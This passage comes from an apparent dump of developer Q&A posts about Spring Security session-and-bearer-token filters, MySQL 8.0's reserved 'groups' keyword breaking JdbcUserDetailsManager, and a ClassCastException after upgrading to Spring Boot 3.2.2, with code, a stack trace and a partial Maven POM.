                System.out.println(&quot;--------------- Session ID Found ------------ &quot;);
                SecurityContext context = SecurityContextHolder.createEmptyContext();
                context.setAuthentication((Authentication) session.getAttribute(&quot;SPRING_SECURITY_CONTEXT&quot;));
                SecurityContextHolder.setContext(context);
                System.out.println(&quot;Removing the Authorization Header......&quot;);
                // Remove the header for Bearer Token Validation to skip BearerTokenAuthenticationFilter.
                HttpServletRequestWrapper requestWrapper = new HttpServletRequestWrapper(request) {
                    @Override
                    public String getHeader(String name) {
                        if (name.equalsIgnoreCase(HttpHeaders.AUTHORIZATION)) {
                            // Remove the header
                            return null;
                        }
                        return super.getHeader(name);
                    }
                };
                filterChain.doFilter(requestWrapper, response);
            } else {
                System.out.println(&quot;Go for Bearer token validation because session not found.....&quot;);
                filterChain.doFilter(request, response);
            }
        } else {
            System.out.println(&quot;Go for Bearer token validation.....&quot;);
            filterChain.doFilter(request, response);
        }
    }
}

</code></pre>
<pre><code>package org.cfx.resouce.server;

import java.io.IOException;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang3.tuple.ImmutablePair;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.web.filter.OncePerRequestFilter;

public class SecurityContextHolderSetterAfterAccessTokenValidation extends OncePerRequestFilter {

    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {

        ImmutablePair&lt;String, String&gt; resolvedHeaders = Utils.resolveHeaders(request);
        String accessToken = resolvedHeaders.left;

        // if cookie present then need to check inside session
        if (accessToken != null) {
            // Session doesn't exist, fall back to token-based authentication
            Authentication context = SecurityContextHolder.getContext().getAuthentication();
            System.out.println(&quot;Context :: &quot; + context);
            HttpSession newSession = request.getSession(true);
            newSession.setAttribute(&quot;SPRING_SECURITY_CONTEXT&quot;, context); // SPRING_SECURITY_CONTEXT
            System.out.println(
                    &quot;Session ID for Newly Created Session::&lt;&lt;&lt;&lt;&lt;&lt; &quot; + newSession.getId() + &quot;  &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot;);
            filterChain.doFilter(request, response);
        } else {
            System.out.println(&quot;Auth Done By Cookie Value...&quot;);
            filterChain.doFilter(request, response);
        }
    }

}

</code></pre>
<ul>
<li>Application Main Class:</li>
</ul>
<pre><code> package org.cfx.resouce.server;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;

@SpringBootApplication

public class ResouceServerMainApp extends SpringBootServletInitializer {

    public static void main(String[] args) {
        SpringApplication.run(ResouceServerMainApp.class, args);
    }


}
</code></pre>
<p><strong>application.properties file:</strong></p>
<pre><code>server.port=8080

server.servlet.context-path=/server

server.shutdown=graceful




#logging.level.org.quartz=DEBUG
#logging.level.org.apache.tomcat.util=DEBUG
#logging.level.org.springframework=DEBUG
logging.level.org.springframework.security=TRACE
#logging.level.com.zaxxer.hikari=DEBUG

#server.tomcat.accesslog.enabled=true
#logging.level.org.apache.tomcat=DEBUG
#logging.level.org.apache.catalina=DEBUG
 
#org.apache.catalina.session.StandardSession.ACTIVITY_CHECK=true

</code></pre>
<p><strong>Curl Command:</strong>
<code>curl --location 'http://localhost:8080/server/msg' --header 'Cookie: JSESSIONID=&lt;JSESSION ID GOES HERE&gt;' --header 'Authorization: Bearer &lt;ACCESS_TOKEN GOES HERE&gt;'</code></p>
"
"<p>MySQL 8.0 now has <code>groups</code> as a reserved keyword.</p>
<p>This means the default implementation for <code>JdbcUserDetailsManager</code> is throwing exceptions as it has not got the table name <code>groups</code> backticked/escaped.</p>
<p>And example of one of the queries is:</p>
<pre><code>public static final String DEF_RENAME_GROUP_SQL = &quot;update groups set group_name = ? where group_name = ?&quot;;
</code></pre>
<p>I am currently just redefining all these queries (and made a new table <code>user_groups</code>) to get around this but was wondering if there was a &quot;better&quot; way or should I raise this as a git issue?</p>
"
"<p>Since upgrading to Spring Boot 3.2.2 we are getting the following exception. Since it doesn't tell us which class in our own code that has this issue, makes it hard to figure out how to resolve this. Any ideas? it is asking for us to add more details, but we have no more details to post, as it is a class cast exception that something has changed in Spring-boot and Spring-Security that now causes code that used to work to now break, but there isn't anything in the documentation or Google search that shows how to fix this exception. We do not extend any of these classes in our code, so it is internal to Spring.</p>
<pre><code>class org.springframework.web.servlet.mvc.method.annotation.ExtendedServletRequestDataBinder cannot be cast to class org.springframework.web.bind.support.WebRequestDataBinder (org.springframework.web.servlet.mvc.method.annotation.ExtendedServletRequestDataBinder and org.springframework.web.bind.support.WebRequestDataBinder are in unnamed module of loader 'app')

java.lang.ClassCastException: class org.springframework.web.servlet.mvc.method.annotation.ExtendedServletRequestDataBinder cannot be cast to class org.springframework.web.bind.support.WebRequestDataBinder (org.springframework.web.servlet.mvc.method.annotation.ExtendedServletRequestDataBinder and org.springframework.web.bind.support.WebRequestDataBinder are in unnamed module of loader 'app')
at org.springframework.web.method.annotation.ModelAttributeMethodProcessor.constructAttribute(ModelAttributeMethodProcessor.java:207)
at org.springframework.web.method.annotation.ModelAttributeMethodProcessor.resolveArgument(ModelAttributeMethodProcessor.java:148)
at org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:122)
at org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:225)
at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:178)
at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118)
at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:884)
at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797)
at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)
at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1081)
at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:974)
at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014)
at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903)
at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564)
at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885)
at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:205)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149)
at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:51)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:174)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:149)
at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108)
at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231)
at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479)
at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340)
at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128)
at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126)
at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
at org.springframework.security.web.authentication.ui.DefaultLogoutPageGeneratingFilter.doFilterInternal(DefaultLogoutPageGeneratingFilter.java:58)
at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
at org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter.doFilter(DefaultLoginPageGeneratingFilter.java:189)
at org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter.doFilter(DefaultLoginPageGeneratingFilter.java:175)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:227)
at org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:221)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
at org.springframework.security.oauth2.client.web.OAuth2AuthorizationRequestRedirectFilter.doFilterInternal(OAuth2AuthorizationRequestRedirectFilter.java:181)
at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227)
at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137)
at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107)
at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93)
at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240)
</code></pre>
<p>EDIT: Updating POM file, removing private information.</p>
<pre class=""lang-xml prettyprint-override""><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;3.2.2&lt;/version&gt;
        &lt;relativePath/&gt;
    &lt;/parent&gt;

    &lt;groupId&gt;com.application&lt;/groupId&gt;
    &lt;artifactId&gt;application-server&lt;/artifactId&gt;
    &lt;version&gt;1.2.0&lt;/version&gt;
    &lt;name&gt;application-server&lt;/name&gt;

    &lt;properties&gt;
        &lt;java.version&gt;17&lt;/java.version&gt;
        &lt;groovy.version&gt;4.0.16&lt;/groovy.version&gt;
        &lt;spring-cloud-azure.version&gt;5.9.1&lt;/spring-cloud-azure.version&gt;
        &lt;spring-cloud-version&gt;4.1.1&lt;/spring-cloud-version&gt;
        &lt;springdoc-openapi-version&gt;1.7.0&lt;/springdoc-openapi-version&gt;
        &lt;aws-java-sdk.version&gt;1.12.661&lt;/aws-java-sdk.version&gt;
        &lt;java-jwt.version&gt;4.3.0&lt;/java-jwt.version&gt;
        &lt;poi.version&gt;5.2.2&lt;/poi.version&gt;
        &lt;xwpf.version&gt;1.0.6&lt;/xwpf.version&gt;
        &lt;swagger-core-version&gt;2.2.8&lt;/swagger-core-version&gt;
        &lt;jackson-version&gt;2.14.2&lt;/jackson-version&gt;
        &lt;oltu-version&gt;1.0.2&lt;/oltu-version&gt;
        &lt;microsoft-graph-version&gt;5.80.0&lt;/microsoft-graph-version&gt;
        &lt;azure-identity-version&gt;1.11.1&lt;/azure-identity-version&gt;
        &lt;jjwt.version&gt;0.9.1&lt;/jjwt.version&gt;
        &lt;bouncycastle.version&gt;1.74&lt;/bouncycastle.version&gt;
        &lt;commons-cli.version&gt;1.5.0&lt;/commons-cli.version&gt;
        &lt;docusign-esign.version&gt;4.4.0&lt;/docusign-esign.version&gt;
        &lt;xml-beans.version&gt;5.1.0&lt;/xml-beans.version&gt;
        &lt;jackson-datatype-hibernate6.version&gt;2.15.2&lt;/jackson-datatype-hibernate6.version&gt;
        &lt;json.version&gt;20240205&lt;/json.version&gt;
        &lt;brsanthu-mgbase64.version&gt;2.2&lt;/brsanthu-mgbase64.version&gt;
        &lt;lucene-analyzers-common.version&gt;8.11.2&lt;/lucene-analyzers-common.version&gt;
        &lt;icu4j.version&gt;72.1&lt;/icu4j.version&gt;
        &lt;itext.version&gt;5.5.13.3&lt;/itext.version&gt;
        &lt;thumbnailator.version&gt;0.4.19&lt;/thumbnailator.version&gt;
        &lt;convertapi.version&gt;2.9&lt;/convertapi.version&gt;
        &lt;logback-logstach.version&gt;7.3&lt;/logback-logstach.version&gt;
        &lt;opencsv.version&gt;5.9&lt;/opencsv.version&gt;
        &lt;aspose.version&gt;23.9&lt;/aspose.version&gt;
        &lt;jsoup.version&gt;1.16.2&lt;/jsoup.version&gt;

        &lt;gmavenplus-maven-plugin.version&gt;1.13.1&lt;/gmavenplus-maven-plugin.version&gt;
        &lt;versions-maven-plugin.version&gt;2.16.2&lt;/versions-maven-plugin.version&gt;
        &lt;maven-surfire-plugin.version&gt;3.2.5&lt;/maven-surfire-plugin.version&gt;
        &lt;spring-boot-maven-plugin.version&gt;3.2.2&lt;/spring-boot-maven-plugin.version&gt;  &lt;!-- Match Boot version above--&gt;
    &lt;/properties&gt;

    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.session&lt;/groupId&gt;
            &lt;artifactId&gt;spring-session-core&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-oauth2-client&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-oauth2-resource-server&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
            &lt;exclusions&gt;
                &lt;exclusion&gt;
                    &lt;groupId&gt;org.ow2.asm&lt;/groupId&gt;
                    &lt;artifactId&gt;asm&lt;/artifactId&gt;
                    &lt;!-- Uses version 9.6 when Spring Boot uses 9.3 it conflicts. Only when we upgrade Boot past 3.2.2--&gt;
                &lt;/exclusion&gt;
            &lt;/exclusions&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springdoc&lt;/groupId&gt;
            &lt;artifactId&gt;springdoc-openapi-ui&lt;/artifactId&gt;
            &lt;version&gt;${springdoc-openapi-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springdoc&lt;/groupId&gt;
            &lt;artifactId&gt;springdoc-openapi-groovy&lt;/artifactId&gt;
            &lt;version&gt;${springdoc-openapi-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
            &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;io.micrometer&lt;/groupId&gt;
            &lt;artifactId&gt;micrometer-registry-prometheus&lt;/artifactId&gt;
            &lt;version&gt;${micrometer.version}&lt;/version&gt; &lt;!-- Use the version compatible with your Spring Boot version --&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.azure.spring&lt;/groupId&gt;
            &lt;artifactId&gt;spring-cloud-azure-starter&lt;/artifactId&gt;
            &lt;version&gt;${spring-cloud-azure.version}&lt;/version&gt;
            &lt;exclusions&gt;
                &lt;exclusion&gt;
                    &lt;groupId&gt;com.azure&lt;/groupId&gt;
                    &lt;artifactId&gt;azure-core&lt;/artifactId&gt;
                &lt;/exclusion&gt;
            &lt;/exclusions&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.microsoft.graph&lt;/groupId&gt;
            &lt;artifactId&gt;microsoft-graph&lt;/artifactId&gt;
            &lt;version&gt;${microsoft-graph-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.azure&lt;/groupId&gt;
            &lt;artifactId&gt;azure-identity&lt;/artifactId&gt;
            &lt;version&gt;${azure-identity-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.thymeleaf.extras&lt;/groupId&gt;
            &lt;artifactId&gt;thymeleaf-extras-springsecurity6&lt;/artifactId&gt;
            &lt;version&gt;${thymeleaf-extras-springsecurity.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.groovy&lt;/groupId&gt;
            &lt;artifactId&gt;groovy-all&lt;/artifactId&gt;
            &lt;version&gt;${groovy.version}&lt;/version&gt;
            &lt;type&gt;pom&lt;/type&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.mysql&lt;/groupId&gt;
            &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt;
            &lt;version&gt;${mysql.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;
            &lt;artifactId&gt;jjwt&lt;/artifactId&gt;
            &lt;version&gt;${jjwt.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
            &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;
            &lt;version&gt;${commons-lang3.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.amazonaws&lt;/groupId&gt;
            &lt;artifactId&gt;aws-java-sdk&lt;/artifactId&gt;
            &lt;version&gt;${aws-java-sdk.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.amazonaws&lt;/groupId&gt;
            &lt;artifactId&gt;aws-java-sdk-rds&lt;/artifactId&gt;
            &lt;version&gt;${aws-java-sdk.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.amazonaws&lt;/groupId&gt;
            &lt;artifactId&gt;aws-java-sdk-sts&lt;/artifactId&gt;
            &lt;version&gt;${aws-java-sdk.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.amazonaws&lt;/groupId&gt;
            &lt;artifactId&gt;aws-java-sdk-iam&lt;/artifactId&gt;
            &lt;version&gt;${aws-java-sdk.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;commons-cli&lt;/groupId&gt;
            &lt;artifactId&gt;commons-cli&lt;/artifactId&gt;
            &lt;version&gt;${commons-cli.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.bouncycastle&lt;/groupId&gt;
            &lt;artifactId&gt;bcprov-jdk18on&lt;/artifactId&gt;
            &lt;version&gt;${bouncycastle.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
            &lt;artifactId&gt;poi&lt;/artifactId&gt;
            &lt;version&gt;${poi.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
            &lt;artifactId&gt;poi-scratchpad&lt;/artifactId&gt;
            &lt;version&gt;${poi.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
            &lt;artifactId&gt;poi-ooxml-full&lt;/artifactId&gt;
            &lt;version&gt;${poi.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
            &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt;
            &lt;version&gt;${poi.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.xmlbeans&lt;/groupId&gt;
            &lt;artifactId&gt;xmlbeans&lt;/artifactId&gt;
            &lt;version&gt;${xml-beans.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.json&lt;/groupId&gt;
            &lt;artifactId&gt;json&lt;/artifactId&gt;
            &lt;version&gt;${json.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt;
            &lt;artifactId&gt;jackson-datatype-hibernate6&lt;/artifactId&gt;
            &lt;version&gt;${jackson-datatype-hibernate6.version}&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;com.docusign&lt;/groupId&gt;
            &lt;artifactId&gt;docusign-esign-java&lt;/artifactId&gt;
            &lt;version&gt;${docusign-esign.version}&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;io.swagger.core.v3&lt;/groupId&gt;
            &lt;artifactId&gt;swagger-annotations&lt;/artifactId&gt;
            &lt;version&gt;${swagger-core-version}&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;!-- HTTP client: jersey-client --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt;
            &lt;artifactId&gt;jersey-client&lt;/artifactId&gt;
            &lt;version&gt;${jersey.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.glassfish.jersey.media&lt;/groupId&gt;
            &lt;artifactId&gt;jersey-media-multipart&lt;/artifactId&gt;
            &lt;version&gt;${jersey.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.glassfish.jersey.media&lt;/groupId&gt;
            &lt;artifactId&gt;jersey-media-json-jackson&lt;/artifactId&gt;
            &lt;version&gt;${jersey.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;!-- Pinned because other libraries rely on this lib and jersey is not backwards compatible now --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.glassfish.jersey.inject&lt;/groupId&gt;
            &lt;artifactId&gt;jersey-hk2&lt;/artifactId&gt;
            &lt;version&gt;${jersey.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;!-- JSON processing: jackson --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.fasterxml.jackson.jakarta.rs&lt;/groupId&gt;
            &lt;artifactId&gt;jackson-jakarta-rs-base&lt;/artifactId&gt;
            &lt;version&gt;${jackson-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.oltu.oauth2&lt;/groupId&gt;
            &lt;artifactId&gt;org.apache.oltu.oauth2.client&lt;/artifactId&gt;
            &lt;version&gt;${oltu-version}&lt;/version&gt;
            &lt;exclusions&gt;
                &lt;exclusion&gt;
                    &lt;groupId&gt;org.json&lt;/groupId&gt;
                    &lt;artifactId&gt;json&lt;/artifactId&gt;
                &lt;/exclusion&gt;
            &lt;/exclusions&gt;
        &lt;/dependency&gt;
        &lt;!-- JWT signing and verifying --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.auth0&lt;/groupId&gt;
            &lt;artifactId&gt;java-jwt&lt;/artifactId&gt;
            &lt;version&gt;${java-jwt.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.fasterxml.jackson.dataformat&lt;/groupId&gt;
            &lt;artifactId&gt;jackson-dataformat-csv&lt;/artifactId&gt;
            &lt;version&gt;${jackson-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt;
            &lt;artifactId&gt;jackson-datatype-jsr310&lt;/artifactId&gt;
            &lt;version&gt;${jackson-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.brsanthu&lt;/groupId&gt;
            &lt;artifactId&gt;migbase64&lt;/artifactId&gt;
            &lt;version&gt;${brsanthu-mgbase64.version}&lt;/version&gt;
            &lt;scope&gt;compile&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;jakarta.ws.rs&lt;/groupId&gt;
            &lt;artifactId&gt;jakarta.ws.rs-api&lt;/artifactId&gt;
            &lt;version&gt;${jakarta-ws-rs.version}&lt;/version&gt;
